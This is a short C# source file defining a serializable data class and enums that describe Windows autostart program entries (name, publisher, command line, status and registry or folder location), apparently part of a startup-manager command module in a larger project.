using System;

namespace Orcus.Shared.Commands.StartupManager
{
    [Serializable]
    public class AutostartProgramInfo
    {
        public string Name { get; set; }
        public bool IsEnabled { get; set; }
        public byte[] Icon { get; set; }
        public string Description { get; set; }
        public string Publisher { get; set; }
        public string CommandLine { get; set; }
        public EntryStatus EntryStatus { get; set; }
        public AutostartLocation AutostartLocation { get; set; }
        public string Filename { get; set; }
    }

    public enum EntryStatus
    {
        Fine,
        NoDescriptionOrCompany,
        FileNotFound
    }

    public enum AutostartLocation : byte
    {
        HKCU_Run,
        HKLM_Run,
        HKLM_WOWNODE_Run,
        //-----------------------------------------------
        ProgramData = 100,
        AppData
    }
}